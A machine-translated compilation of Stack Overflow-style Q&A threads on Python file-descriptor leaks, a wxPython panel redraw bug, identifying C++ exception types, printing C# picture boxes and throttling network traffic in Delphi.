> 时间：2014-05-20T14:22:46.747

我有类似的问题，在 subprocess.Popen() 调用期间用完了文件描述符。我使用以下脚本来调试正在发生的事情：

```
import os
import stat

_fd_types = (
    ('REG', stat.S_ISREG),
    ('FIFO', stat.S_ISFIFO),
    ('DIR', stat.S_ISDIR),
    ('CHR', stat.S_ISCHR),
    ('BLK', stat.S_ISBLK),
    ('LNK', stat.S_ISLNK),
    ('SOCK', stat.S_ISSOCK)
)

def fd_table_status():
    result = []
    for fd in range(100):
        try:
            s = os.fstat(fd)
        except:
            continue
        for fd_type, func in _fd_types:
            if func(s.st_mode):
                break
        else:
            fd_type = str(s.st_mode)
        result.append((fd, fd_type))
    return result

def fd_table_status_logify(fd_table_result):
    return ('Open file handles: ' +
            ', '.join(['{0}: {1}'.format(*i) for i in fd_table_result]))

def fd_table_status_str():
    return fd_table_status_logify(fd_table_status())

if __name__=='__main__':
    print fd_table_status_str() 
```

您可以导入此模块并调用`fd_table_status_str()`以在代码中的不同点记录文件描述符表状态。

另外，确保 subprocess.Popen 实例被销毁。在 Windows 中保留对 Popen 实例的引用会阻止 GC 运行。如果保留实例，则关联的管道不会关闭。更多信息[在这里](http://mihalop.blogspot.gr/2014/05/python-subprocess-and-file-descriptors.html)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T17:12:26.283

查看输出`ls -l /proc/$pid/fd/`（当然要替换您进程的 PID）以查看打开了哪些文件 [或者，在 win32 上，使用[Process Explorer](http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)列出打开的文件]；然后找出你在代码中打开它们的位置，并确保它`close()`被调用。（是的，垃圾收集器最终会关闭事物，但它并不总是足够快以避免耗尽 fds）。

检查任何可能阻止垃圾收集的循环引用也是一个好习惯。（循环收集器最终会处理掉这些——但它可能不会足够频繁地运行以避免文件描述符耗尽；我个人对此感到很痛苦）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-18T17:28:47.040

使用[Process Explorer](http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)，选择您的进程， View->Lower Pane View->Handles - 然后寻找看起来不合适的地方 - 通常打开许多相同或相似的文件指向问题。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2010-12-19T23:01:21.787

`lsof -p <process_id>`在包括 FreeBSD 在内的几个类 UNIX 系统上运行良好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-05-24T15:52:06.217

虽然 OP 有一个 Windows 系统，但我相信这里的很多人（比如我自己）也在寻找其他人（它甚至没有标记为 Windows）。

谷歌有一个[`psutil`](https://code.google.com/archive/p/psutil/wikis/Documentation.wiki#Processes)带有`get_open_files()`方法的包。它看起来像一个出色的界面，但它似乎已经有几年没有维护了。实际上，我在 Linux 上为我自己的 Python 2 项目编写了一个实现。我使用它`unittest`来确保我的函数清理它们的资源。

```
import os

# calling this **synchronously** will accurately relay open files on Linux
def get_open_files(pid):
    # directory spawned by Python process, containing its file descriptors
    path = "/proc/%d/fd" % pid
    # list the abspaths belonging to that directory
    links = ["%s/%s" % (path, f) for f in os.listdir(path)]
    # filter out the bad ones returned by os.listdir()
    valid_links = filter(lambda f: os.path.exists(f), links)
    # these links are fd integers, so map them to their actual file devices
    devices = map(lambda f: os.readlink(f), valid_links)
    # remove any ones that are stdin, stdout, stderr, etc.
    return filter(lambda f: "/dev/pts" not in f, devices) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-07-30T19:29:53.170

Python 自己的测试套件有一个使用[fd_count的](https://github.com/python/cpython/blob/48a62559dfaf775e4f1cc56b19379c799e8e2587/Lib/test/support/os_helper.py)[refleak 模块](https://github.com/python/cpython/blob/48a62559dfaf775e4f1cc56b19379c799e8e2587/Lib/test/libregrtest/refleak.py)。跨操作系统工作，可在完整安装中使用：

```
>>> from test.support.os_helper import fd_count
>>> fd_count()
27 
```

在 Python 3.9 及更早版本上，`os_helper`不存在，所以`from test.support import fd_count`.

# python - wxPython - 替换 wxFrame 的面板时重绘错误

> ID：561991
> 
> 赞同：0
> 
> 时间：2009-02-18T17:09:37.740
> 
> 标签：python, wxpython, wxwidgets

我第一次创建了一个小型 wxPython 实用程序，但遇到了一个问题。

我想将组件添加到已创建的框架中。为此，我将销毁框架的旧面板，并创建一个包含所有新组件的新面板。

1：有没有更好的方法来动态添加内容到面板？

2：为什么，在下面的例子中，我得到一个奇怪的重绘错误，在面板中只在左上角绘制，并且在调整大小时，面板被正确绘制？（WinXP、Python 2.5、最新的 wxPython）

感谢您的帮助！

```
 import wx

class MainFrame(wx.Frame):
    def __init__(self):
        wx.Frame.__init__(self, None, -1, 'TimeTablr')

        #Variables
        self.iCalFiles = ['Empty', 'Empty', 'Empty']
        self.panel = wx.Panel(self, -1)
        self.layoutElements()        

    def layoutElements(self):
        self.panel.Destroy()
        self.panel = wx.Panel(self, -1)
        #Buttons
        self.getFilesButton = wx.Button(self.panel, 1, 'Get Files')
        self.calculateButton = wx.Button(self.panel, 2, 'Calculate')
        self.quitButton = wx.Button(self.panel, 3, 'Quit Application')

        #Binds
        self.Bind(wx.EVT_BUTTON, self.Quit, id=3)
        self.Bind(wx.EVT_BUTTON, self.getFiles, id=1)

        #Layout Managers
        vbox = wx.BoxSizer(wx.VERTICAL)

        #Panel Contents
        self.ctrlsToDescribe = []
        self.fileNames = []
        for iCalFile in self.iCalFiles:
            self.ctrlsToDescribe.append(wx.TextCtrl(self.panel, -1))
            self.fileNames.append(wx.StaticText(self.panel, -1, iCalFile))

        #Add Components to Layout Managers
        for i in range(0, len(self.ctrlsToDescribe)):
            hboxtemp = wx.BoxSizer(wx.HORIZONTAL)
            hboxtemp.AddStretchSpacer()
            hboxtemp.Add(self.fileNames[i], 1, wx.EXPAND)
            hboxtemp.AddStretchSpacer()
            hboxtemp.Add(self.ctrlsToDescribe[i], 2, wx.EXPAND)
            hboxtemp.AddStretchSpacer()
            vbox.Add(hboxtemp)

        finalHBox = wx.BoxSizer(wx.HORIZONTAL)
        finalHBox.Add(self.getFilesButton)
        finalHBox.Add(self.calculateButton)
        finalHBox.Add(self.quitButton)

        vbox.Add(finalHBox)
        self.panel.SetSizer(vbox)
        self.Show()

    def Quit(self, event):
        self.Destroy()

    def getFiles(self, event):
        self.iCalFiles = ['Example1','Example1','Example1','Example1','Example1','Example1']
        self.layoutElements()
        self.Update()

app = wx.App()
MainFrame()
app.MainLoop()
del app 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T17:25:31.290

1）我相信 Sizer 会让您将元素插入到它们的现有顺序中。那可能会快一点。

2) 我没有看到您在 OSX 上描述的行为，但猜测一下，尝试在 layoutElements 中的 self.Show() 之前调用 self.Layout()？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-06T08:29:12.843

我有一个类似的问题，面板会被挤压到右上角。我通过调用解决了它`panel.Fit()`。

在您的示例中，您应该调用`self.panel.Fit()`after`self.panel.SetSizer(vbox)`

# c++ - 捕获异常后确定异常类型？

> ID：561997
> 
> 赞同：50
> 
> 时间：2009-02-18T17:10:32.417
> 
> 标签：c++, exception, exception-handling

有没有办法确定异常类型，即使你知道你用 catch all 捕获了异常？

例子：

```
try
{
   SomeBigFunction();
}
catch(...)
{
   //Determine exception type here
} 
```

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2009-02-18T17:17:31.107

简短的回答：没有。

长答案：

如果您从一个通用的基本类型（例如 std::exception）派生所有异常并显式捕获它，那么您可以使用它从您的异常中获取类型信息。

但是您应该使用 catch 的功能来捕获特定类型的异常，然后从那里开始工作。

catch(...) 唯一真正的用途是：

*   捕获：并丢弃异常（停止异常转义析构函数）。
*   捕获：记录发生的未知异常并重新抛出。

编辑：您可以通过 dynamic_cast<>() 或通过 typid() 提取类型信息，尽管如上所述，这不是我推荐的东西。使用 case 语句。

```
#include <stdexcept>
#include <iostream>

class X: public std::runtime_error  // I use runtime_error a lot
{                                   // its derived from std::exception
    public:                         // And has an implementation of what()
        X(std::string const& msg):
            runtime_error(msg)
        {}
};

int main()
{
    try
    {
        throw X("Test");
    }
    catch(std::exception const& e)
    {
        std::cout << "Message: " << e.what() << "\n";

        /*
         * Note this is platform/compiler specific
         * Your milage may very
         */
        std::cout << "Type:    " << typeid(e).name() << "\n";
    }
} 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2009-02-18T19:24:23.143

您实际上可以在 catch(...) 中确定类型，但它不是很有用：

```
#include <iostream>
#include <exception>

    class E1 : public std::exception {};
    class E2 : public std::exception {};

    int main() {
        try {
            throw E2();
        }
        catch( ... ) {
            try {
                throw;
            }
            catch( const E1 & e ) {
                std::cout << "E1\n";
            }
            catch( const E2 & e ) {
                std::cout << "E2\n";
            }
        }
    } 
```

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2017-11-07T17:59:37.880

没有标准的、可移植的方法来做到这一点。这是在 GCC 和 clang 上执行此操作的非便携式方式

```
#include <iostream>
#include <cxxabi.h>

const char* currentExceptionTypeName()
{
    int status;
    return abi::__cxa_demangle(abi::__cxa_current_exception_type()->name(), 0, 0, &status);
}

int main()
{
    try {
        throw std::string();
    } catch (...) {
        std::cout<<"Type of caught exception is "<<currentExceptionTypeName()<<std::endl;
    }

    return 0;
} 
```

输出：

```
Type of caught exception is std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2018-04-11T19:41:44.523

前提是 c++11 可用，

```
bool throwing_func()
{
    // something is wrong...
    throw char('5');

    // ...

    return true;
}

void exception_handler(std::exception_ptr _Eptr)
{
    try 
    {
        if (_Eptr) {std::rethrow_exception(_Eptr);}
    }

    catch(int _Xi)
    {
        std::cout << "int\n";
    }

    catch(char _Xc)
    {
        std::cout << "char\n";
    }

    catch(const std::exception& _Xe)
    {
       std::cout << "std::exception " << _Xe.what() << "\n";
    }

    catch (...)
    {// develop more catch cases above to avoid what follows
        std::cout << "unhandled exception\n";
        // grande problema
    }
}

int main()
{

    try
    {
        throwing_func();
    }

    catch(...)
    {
        //Determine exception type here

         exception_handler(std::current_exception());
    }

    return 0;
} 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-02-18T17:17:17.817

如果您需要根据它们的不同来处理异常，您应该捕获特定的异常。如果有一组异常都需要以相同的方式处理，那么从公共基类派生它们并捕获基类将是可行的方法。利用语言的力量和范式，不要与它们对抗！

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-18T17:16:58.813

不。

这样做至少需要您能够访问当前异常。我不相信有这样做的标准方法。

一旦有了异常实例，就必须使用类型检查算法。C++ 对此没有固有的支持。充其量你必须有一个带有 dynamic_cast 的大 if/elseif 语句来检查类型。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-02-12T19:50:07.043

这个问题是前段时间提出的，我提供这个答案作为 9 年前接受的答案的伴侣。我不得不同意那个回答，“......不是很有用”。此外，它为曾经处理过但未处理的异常打开了大门。为了说明，让我以受访者的回答为基础

```
#include <iostream>
#include <exception>

class E1 : public std::exception {};
class E2 : public std::exception {};
class E3 : public std::exception {};

int main() {
    try {
        throw E3();
    }
    catch( ... ) {
        try {
            // OOOPS!!! E3 is now unhandled!!!!!!
            throw;
        }
        catch( const E1 & e ) {
            std::cout << "E1\n";
        }
        catch( const E2 & e ) {
            std::cout << "E2\n";
        }
    }
} 
```

这种方法的替代方法如下：

```
#include <iostream>
#include <exception>

class E1 : public std::exception {};
class E2 : public std::exception {};
class E3 : public std::exception {};

int main() {
    try {
        throw E3();
    }
    catch( const E1 & e ) {
        std::cout << "E1\n";
    }
    catch( const E2 & e ) {
        std::cout << "E2\n";
    }
    catch( ... ) {
        std::cout << "Catch-all...";
    }
} 
```

第二种方法似乎等同于第一种方法，并且具有专门处理然后捕获其他所有内容的`E1`优点`E2`。这仅作为替代提供。

请注意，根据 2011-02-28 的 C++ 草案，第 15.3 段，项目符号 5，“*如果存在，...处理程序应为其 try 块的最后一个处理程序。* ”

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-06-10T17:48:10.053

我尝试了各种方法；这对我有用：

*从继承 runtime_error*开始：

```
/*----------------------------------------------------------------------*/    
/* subclass runtime_error for safe exceptions in try/throw/catch        */

 #include <stdexcept>
/* a little preprocessor magic here -- makes a subclass of runtime_error*/

#define NEWERROR( NE )  class NE  : public runtime_error {              \
        public:  NE ( string const& error ) : runtime_error(error) {}  }

NEWERROR( FileError      );
NEWERROR( NetworkError   );
NEWERROR( StringError    );
NEWERROR( CofeeError     );

/*----------------------------------------------------------------------*/ 
```

然后，您可以创建一些异常实例。

```
/*----------------------------------------------------------------------*/
/* some example pre-defined exceptions  */

FileError     ReadOnly                ( "ReadOnly"             );
FileError     FileNotFound            ( "FileNotFound"         );
NetworkError  TimeOutExceeded         ( "TimeOutExceeded"      );
NetworkError  HostNotFound            ( "HostNotFound"         );
CoffeeError   OutOfCoffee             ( "OutOfCoffee"          );

/*----------------------------------------------------------------------*/ 
```

明确通知编译器您的函数可能会抛出异常，或者程序可能会在抛出点终止，并且如果当时正在使用资源，数据可能会丢失或损坏。

*“确保你能抓住任何你能扔的东西。”*

（我使用通用的*runtime_error*是因为抛出和捕获它涵盖了我所有的异常以及系统的异常。）

```
/*----------------------------------------------------------------------*/
/* example function that may throw an exception */

#include <fstream>

ifstream& getFileStream (string fname) throw (runtime_error)
 {

    if ( fname == "" ) 
      throw StringError( "<getFileStream> fname:empty string" );
      // processing stops here if thrown

    try 
      {
       ifstream Inputfstream;  

       ifstream& ifsref = Inputfstream;

       // ifstream has its own <legacy> exception
       // mechanisms and procedures 
       ifsref.exceptions ( ifstream::failbit | ifstream::badbit );

       ifsref.open (fname , ifstream::in);  // could fail ==> ifstream::failure exception
      }
    catch (ifstream::failure e) 
      {
       throw FileError( fname + string(e.what() ) ); 
      }

    return ifsref;
 }

/*----------------------------------------------------------------------*/ 
```

然后在你的 try/catch

```
/*----------------------------------------------------------------------*/
catch (FileNotFound fnf) //catch a specific error
 {
  if (DEBUG) cerr << "[File Not Found Error: " << fnf.what() << "]" << endl;
  ... (handle it) ... 
 }  
catch (FileError fe) //catch a specific type
 {
  if (DEBUG) cerr << "[File Error: " << fe.what() << "]" << endl;
  ... (handle it) ... 
 }  
catch (runtime_error re ) // catch a generic type
 {
   if (DEBUG) cerr << "[Runtime error: " << re.what() << "]" << endl;          

    // determine type by string comparison
   if ( re.what() == string("ResourceNotavailable") )  ...
   if ( re.what() == string("NetWorkError")         )  ...   

  ...

}
catch ( ... )  // catch everything else 
 { ... exit, rethrow, or ignore ... }

/*----------------------------------------------------------------------*/ 
```

*runtime-error*类在 c++ 标准库中有很好的支持，编译器内部知道它，以及如何优化内存和调度，因此您可以安全而自信地在不同的代码库中使用它们。该代码是可移植的，并且与许多不同的编译器和架构兼容。

如果您觉得一系列字符串匹配会严重浪费 CPU 和内存（编译器会优化这些），那么在 catch 子句中分别捕获每个错误可能会更可取且更快一些，从更具体到更通用。

`<stdexcept>` 在 2 组中为您提供几种例外情况：

*   逻辑错误：

    ```
    logic_error
    domain_error
    invalid_argument
    length_error
    out_of_range 
    ```

*   运行时错误：

    ```
    runtime_error
    range_error
    overflow_error
    underflow_error 
    ```

其中一些使用语法略有不同。

C++ 中的传统智慧说您的异常应该是相对“扁平的”，这意味着应该避开特定类别异常的大型层次结构，而支持用于一般编程任务的简短通用但信息丰富的异常。网络系统逻辑、高等数学等领域特定的任务可能会受益于特异性，但这可以通过使用通用运行时/逻辑异常生成智能错误字符串来轻松实现。

最后，*我的观点是：您可以通过***仅抛出和捕获 runtime_error**来实现所有这些 。

您不必为每个类创建一整套高度特定的异常（就像 java 那样），每个类都处理一个特定的错误。

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2010-06-09T08:58:45.500

如果您使用的是 Visual C++（托管），则可以使用 GetType() 方法获取异常类型并从那里处理它。

例如

```
try
    {
        // Run the application
        Application::Run(mainForm);
    }
    catch (Exception^ e)
    {
        String^ exception_type = e->GetType()->ToString();
        throw;
    } 
```

该字符串将包含类似“System.ArgumentOutOfRangeException”的内容。

# c# - C#如何打印多个图片框

> ID：561998
> 
> 赞同：0
> 
> 时间：2009-02-18T17:10:45.210
> 
> 标签：c#, printing, picturebox

我有 2 个图片框：pb1 和 pb2。pb1可以拖放，pb2不能。Pb1 也可以调整大小。

我想要的是，当 pb1 在 pb2 内时，（pb1 和 pb2）都必须打印。pb1 必须保持它的大小。当查看 prinpreview 时，可以看到 pb1 具有它的原始大小。

那么，我如何打印这 2 个打印框并确保 pb1 保持调整大小？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T17:42:15.103

好吧，我确定它不是最佳的，但是您可以通过将调整大小的图片的内容绘制到新的位图，`Pb1.DrawToBitmap`并将 Pb1 图像重置为新图像并打印。

我应该提到我之前没有从图片框打印，所以我不明白整个问题。

# delphi - 如何监控/限制我的应用使用的网络流量？

> ID：561999
> 
> 赞同：2
> 
> 时间：2009-02-18T17:10:46.473
> 
> 标签：delphi, networking, monitoring, bandwidth

我希望能够测量网络流量并对其进行限制。

我正在寻找可以让我在两次通话之间知道已发送和接收多少数据的东西。此外，我希望能够限制我的应用程序的网络流量（进出）。类似于 NetLimiter 软件（很棒的应用程序！），但我可以通过我的代码进行控制。

你知道一些第三方组件可以做到这一点吗？

这意味着要在 datasnap 2009 瘦客户端上使用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T17:38:50.697

如果您使用 Indy，请使用[`TIdInterceptThrottler`](http://www.indyproject.org/docsite/html/TIdInterceptThrottler.html)该类。只需设置`BitsPerSec`属性。

我的理解是 DataSnap 是基于 Indy 的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T20:46:24.817

如果您指的是整个系统（而不是应用程序-有点不清楚），您可以查看[WinPCap](http://www.winpcap.org)。有可用的 Delphi 包装器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-10-10T13:17:48.777

如果您正在基于 unix 的机器（例如 Linux）上开发应用程序，则可以使用 linux 的内置防火墙名称来限制连接速度`iptables`。*****